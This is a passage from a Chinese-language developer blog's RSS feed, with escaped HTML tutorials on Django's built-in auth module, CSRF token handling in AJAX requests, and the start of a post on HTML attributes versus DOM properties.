        &lt;span style=&#34;color:#75715e&#34;&gt;# 调用auth模块的认证方法，判断用户名和密码是否正确，正确返回一个user_obj&lt;/span&gt;
        user_obj &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; auth&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;authenticate(username&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;username, password&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;pwd)
        &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; user_obj:
            &lt;span style=&#34;color:#75715e&#34;&gt;# 登录成功,设置Session数据&lt;/span&gt;
            auth&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;login(request, user_obj)
            &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; HttpResponse(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;登录成功&amp;#39;&lt;/span&gt;)
        &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt;:
            &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; render(request, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;login.html&amp;#39;&lt;/span&gt;, {&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;error_msg&amp;#39;&lt;/span&gt;: &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;用户名或者密码错误&amp;#39;&lt;/span&gt;})
    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; render(request, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;login.html&amp;#39;&lt;/span&gt;)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;4autologoutrequest&#34;&gt;4.auto.logout(request)&lt;/h2&gt;
&lt;p&gt;该函数会将当前请求的 session 信息会全部清除。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;from&lt;/span&gt; django.contrib &lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; auth
   
&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;logout&lt;/span&gt;(request):
    auth&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;logout(request)
    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; redirect(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;/login/&amp;#39;&lt;/span&gt;)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;5login_required&#34;&gt;5.@login_required&lt;/h2&gt;
&lt;p&gt;该装饰器可以便捷的为某个视图添加登录校验，若用户没有登录，则会跳转到默认的登录界面并传递当前访问界面的绝对路径 (登陆成功后，会重定向到该路径)。如果需要自定义登录的URL，则需要在&lt;code&gt;settings.py&lt;/code&gt;文件中通过&lt;code&gt;LOGIN_URL = &#39;/login/&#39;&lt;/code&gt;进行修改。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;from&lt;/span&gt; django.contrib.auth.decorators &lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; login_required
      
&lt;span style=&#34;color:#a6e22e&#34;&gt;@login_required&lt;/span&gt;
&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;index&lt;/span&gt;(request):
    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; render(request, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;index.html&amp;#39;&lt;/span&gt;)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;6create_user&#34;&gt;6.create_user()&lt;/h2&gt;
&lt;p&gt;该函数可以创建一个新用户，注意创建时明文输入的密码会在数据库中加密存在。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;from&lt;/span&gt; django.contrib.auth.models &lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; User
user &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; User&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;objects&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;create_user(username&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;用户名&amp;#39;&lt;/span&gt;,password&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;密码&amp;#39;&lt;/span&gt;,email&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;邮箱&amp;#39;&lt;/span&gt;,&lt;span style=&#34;color:#f92672&#34;&gt;...&lt;/span&gt;)

&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;reg&lt;/span&gt;(request):
    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; request&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;method &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;POST&amp;#39;&lt;/span&gt;:
        username &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; request&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;POST&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;get(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;username&amp;#39;&lt;/span&gt;)
        pwd &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; request&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;POST&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;get(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;password&amp;#39;&lt;/span&gt;)
        &lt;span style=&#34;color:#75715e&#34;&gt;# 假设数据都经过有效性校验了&lt;/span&gt;
        &lt;span style=&#34;color:#75715e&#34;&gt;# 去数据库创建一条记录&lt;/span&gt;
        User&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;objects&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;create_user(username&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;username, password&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;pwd)  
        &lt;span style=&#34;color:#75715e&#34;&gt;# create_user创建普通用户&lt;/span&gt;
        &lt;span style=&#34;color:#75715e&#34;&gt;# User.objects.create_superuser(username=username, password=pwd)  &lt;/span&gt;
        &lt;span style=&#34;color:#75715e&#34;&gt;# create_superuser创建超级用户&lt;/span&gt;
        &lt;span style=&#34;color:#75715e&#34;&gt;# 创建成功，跳转登录页年&lt;/span&gt;
        &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; redirect(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;/login/&amp;#39;&lt;/span&gt;)
    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; render(request, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;reg.html&amp;#39;&lt;/span&gt;)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;7check_passwordraw_password&#34;&gt;7.check_password(raw_password)&lt;/h2&gt;
&lt;p&gt;该函数可以对密码的正确与否进行检查。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;ok &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; user_obj&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;check_password(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;密码&amp;#39;&lt;/span&gt;)
&lt;span style=&#34;color:#75715e&#34;&gt;# 或者直接针对当前请求的user对象校验原密码是否正确：&lt;/span&gt;
ok &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; request&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;user&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;check_password(raw_password&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;原密码&amp;#39;&lt;/span&gt;)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;8is_authenticated&#34;&gt;8.is_authenticated()&lt;/h2&gt;
&lt;p&gt;该函数可以判断用户是否通过验证。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;my_view&lt;/span&gt;(request):
  &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;not&lt;/span&gt; request&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;user&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;is_authenticated():
    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; redirect(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;%s&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;?next=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;%s&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; (settings&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;LOGIN_URL, request&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;path))
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;9set_password&#34;&gt;9.set_password()&lt;/h2&gt;
&lt;p&gt;该函数能实现对密码的修改，注意在不能直接的查找密码修改，这是因为在数据库中用户的密码是以加密形式存在的，&lt;code&gt;auth&lt;/code&gt;的验证是先接收明文密码，在加密后进行验证，如果直接修改则明文加密后与数据库的明文密码便对接不上。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;request&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;user&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;set_password(pwd)
request&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;user&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;save()  &lt;span style=&#34;color:#75715e&#34;&gt;# 修改密码&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;10扩展auto默认表&#34;&gt;10.扩展auto默认表&lt;/h2&gt;
&lt;p&gt;由于默认的&lt;code&gt;auth_user&lt;/code&gt;表字段都是固定的，如果用户需要添加别的字段，可以这样操作：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;方法一：新建另外一张表然后通过一对一和内置的auth_user表关联。&lt;/li&gt;
&lt;li&gt;方法二：通过继承内置的AbstractUser类，来定义一个自己的Model类。&lt;/li&gt;
&lt;/ul&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;models&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;py
&lt;span style=&#34;color:#f92672&#34;&gt;from&lt;/span&gt; django.db &lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; models
&lt;span style=&#34;color:#f92672&#34;&gt;from&lt;/span&gt; django.contrib.auth.models &lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; AbstractUser


&lt;span style=&#34;color:#66d9ef&#34;&gt;class&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;UserInfo&lt;/span&gt;(AbstractUser):
    &lt;span style=&#34;color:#75715e&#34;&gt;# 这里定义拓展的字段&lt;/span&gt;
    gender &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; models&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;PositiveIntegerField(choices&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;((&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;女&amp;#39;&lt;/span&gt;),(&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;男&amp;#39;&lt;/span&gt;), (&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;保密&amp;#39;&lt;/span&gt;)))
    phone &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; models&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;CharField(max_length&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;11&lt;/span&gt;)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;需要注意的是，在扩展表后一定要在&lt;code&gt;settings.py&lt;/code&gt;中告诉Django现在使用新定义的&lt;code&gt;UserInfo&lt;/code&gt;表来做用户认证，&lt;code&gt;AUTH_USER_MODEL = &amp;quot;app名.UserInfo&amp;quot;&lt;/code&gt;。&lt;/p&gt;
&lt;p&gt;PS：当自定义用户表与框架自动生成的用户表发生冲突时，即执行 &lt;code&gt;migrate&lt;/code&gt; 命令同步数据库时出现错误，此时可以打开&lt;code&gt;settings.py&lt;/code&gt;注释掉&lt;code&gt;INSTALL_APPS&lt;/code&gt;中的&lt;code&gt;django.contrib.admin&lt;/code&gt;，然后再次同步便可以解决该问题。为避免出现以上的问题，建议在创建数据库前先把自定义的用户表定义好。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;参考原文：&lt;a class=&#34;link&#34; href=&#34;https://www.cnblogs.com/Zzbj/p/9984783.html&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt; Django自带的用户认证auth模块  @Zzbj &lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
</description>
        </item>
        <item>
        <title>Django—CSRF中间件</title>
        <link>https://ac-lm.github.io/posts/django/djangocsrf%E4%B8%AD%E9%97%B4%E4%BB%B6/</link>
        <pubDate>Sun, 25 Jul 2021 00:00:00 +0000</pubDate>
        
        <guid>https://ac-lm.github.io/posts/django/djangocsrf%E4%B8%AD%E9%97%B4%E4%BB%B6/</guid>
        <description>&lt;h2 id=&#34;1csrf-中间件&#34;&gt;1.CSRF 中间件&lt;/h2&gt;
&lt;p&gt;CSRF 中间件&lt;code&gt;django.middleware.csrf.CsrfViewMiddleware&lt;/code&gt;默认在&lt;code&gt;setting.py&lt;/code&gt;设置中激活。&lt;/p&gt;
&lt;p&gt;在使用 POST 表单的任何模板中，如果表单用于内部 URL，请在元素内使用&lt;code&gt;csrf_token&lt;/code&gt;标签，例如&lt;code&gt;&amp;lt;form method=&amp;quot;post&amp;quot;&amp;gt;{% csrf_token %}&lt;/code&gt;，对于针对外部 URL 的 POST 表单，不应这样做，因为这将导致 CSRF 令牌被泄露，从而导致漏洞。&lt;/p&gt;
&lt;h2 id=&#34;2异步-post-带-csrf-令牌传递&#34;&gt;2.异步 POST 带 CSRF 令牌传递&lt;/h2&gt;
&lt;p&gt;对于任何 AJAX POST 请求，都需要将 CSRF 令牌作为 POST 数据传递进来，您可以获取这样的令牌。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-javascript&#34; data-lang=&#34;javascript&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;function&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;getCookie&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;name&lt;/span&gt;) {
    &lt;span style=&#34;color:#66d9ef&#34;&gt;let&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;cookieValue&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;null&lt;/span&gt;;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (document.&lt;span style=&#34;color:#a6e22e&#34;&gt;cookie&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; document.&lt;span style=&#34;color:#a6e22e&#34;&gt;cookie&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;!==&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;) {
        &lt;span style=&#34;color:#66d9ef&#34;&gt;const&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;cookies&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; document.&lt;span style=&#34;color:#a6e22e&#34;&gt;cookie&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;split&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;;&amp;#39;&lt;/span&gt;);
        &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; (&lt;span style=&#34;color:#66d9ef&#34;&gt;let&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;i&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;; &lt;span style=&#34;color:#a6e22e&#34;&gt;i&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;cookies&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;length&lt;/span&gt;; &lt;span style=&#34;color:#a6e22e&#34;&gt;i&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;) {
            &lt;span style=&#34;color:#66d9ef&#34;&gt;const&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;cookie&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;cookies&lt;/span&gt;[&lt;span style=&#34;color:#a6e22e&#34;&gt;i&lt;/span&gt;].&lt;span style=&#34;color:#a6e22e&#34;&gt;trim&lt;/span&gt;();
            &lt;span style=&#34;color:#75715e&#34;&gt;// Does this cookie string begin with the name we want?
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;            &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (&lt;span style=&#34;color:#a6e22e&#34;&gt;cookie&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;substring&lt;/span&gt;(&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;name&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;length&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;===&lt;/span&gt; (&lt;span style=&#34;color:#a6e22e&#34;&gt;name&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;=&amp;#39;&lt;/span&gt;)) {
                &lt;span style=&#34;color:#a6e22e&#34;&gt;cookieValue&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; decodeURIComponent(&lt;span style=&#34;color:#a6e22e&#34;&gt;cookie&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;substring&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;name&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;length&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;));
                &lt;span style=&#34;color:#66d9ef&#34;&gt;break&lt;/span&gt;;
            }
        }
    }
    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;cookieValue&lt;/span&gt;;
}
&lt;span style=&#34;color:#66d9ef&#34;&gt;const&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;csrftoken&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;getCookie&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;csrftoken&amp;#39;&lt;/span&gt;);
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;最后需要在 POST 请求中设置请求头&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-javascript&#34; data-lang=&#34;javascript&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;const&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;request&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;new&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;Request&lt;/span&gt;(
    &lt;span style=&#34;color:#75715e&#34;&gt;/* URL */&lt;/span&gt;,
    {&lt;span style=&#34;color:#a6e22e&#34;&gt;headers&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; {&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;X-CSRFToken&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;csrftoken&lt;/span&gt;}}
);
&lt;span style=&#34;color:#a6e22e&#34;&gt;fetch&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;request&lt;/span&gt;, {
    &lt;span style=&#34;color:#a6e22e&#34;&gt;method&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;POST&amp;#39;&lt;/span&gt;,
    &lt;span style=&#34;color:#a6e22e&#34;&gt;mode&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;same-origin&amp;#39;&lt;/span&gt;  &lt;span style=&#34;color:#75715e&#34;&gt;// Do not send CSRF token to another domain.
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;}).&lt;span style=&#34;color:#a6e22e&#34;&gt;then&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;function&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;response&lt;/span&gt;) {
    &lt;span style=&#34;color:#75715e&#34;&gt;// ...
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;});
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description>
        </item>
        <item>
        <title>Web开发—attribute 和 property 的区别</title>
        <link>https://ac-lm.github.io/posts/web/web%E5%BC%80%E5%8F%91attribute-%E5%92%8C-property-%E7%9A%84%E5%8C%BA%E5%88%AB/</link>
        <pubDate>Sun, 25 Jul 2021 00:00:00 +0000</pubDate>
        
        <guid>https://ac-lm.github.io/posts/web/web%E5%BC%80%E5%8F%91attribute-%E5%92%8C-property-%E7%9A%84%E5%8C%BA%E5%88%AB/</guid>
        <description>&lt;blockquote&gt;
&lt;p&gt;参考原文：&lt;a class=&#34;link&#34; href=&#34;https://www.cnblogs.com/lmjZone/p/8760232.html&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt; JS中attribute和property的区别  @L_mj &lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&#34;1介绍&#34;&gt;1.介绍&lt;/h2&gt;
&lt;p&gt;&lt;code&gt;property&lt;/code&gt;和&lt;code&gt;attribute&lt;/code&gt;虽然都称为属性，但两者不是同一个东西，&lt;code&gt;property&lt;/code&gt;是 DOM 中的属性，是 JavaScript 里的对象；&lt;code&gt;attribute&lt;/code&gt;是 HTML 标签上的属性，它的值只能够是字符串；简单理解，&lt;code&gt;attribute&lt;/code&gt;就是 DOM 节点自带的属性，例如 HTML 中常用的&lt;code&gt;id、class、title、align&lt;/code&gt;等。而&lt;code&gt;property&lt;/code&gt;是这个 DOM 元素作为对象，其附加的内容，例如&lt;code&gt;childNodes、firstChild&lt;/code&gt;等。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-html&#34; data-lang=&#34;html&#34;&gt;&amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;div&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;id&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;div1&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;class&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;divClass&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;title&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;divTitle&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;title1&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;divTitle1&amp;#34;&lt;/span&gt;&amp;gt;&amp;lt;/&lt;span style=&#34;color:#f92672&#34;&gt;div&lt;/span&gt;&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;如上述的&lt;code&gt;div&lt;/code&gt;标签，当我们使用&lt;code&gt;var in1=document.getElementById(&amp;quot;div1&amp;quot;)&lt;/code&gt;获取这个元素并打印时&lt;code&gt;console.log(in1)&lt;/code&gt;，可以看到如下图的属性。&lt;/p&gt;
&lt;p&gt;&lt;figure 
	&gt;
	&lt;a href=&#34;https://ac-lm.github.io/drawingbed/img/202205051102194.png&#34; &gt;
		&lt;img src=&#34;https://ac-lm.github.io/drawingbed/img/202205051102194.png&#34;
			
			
			
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
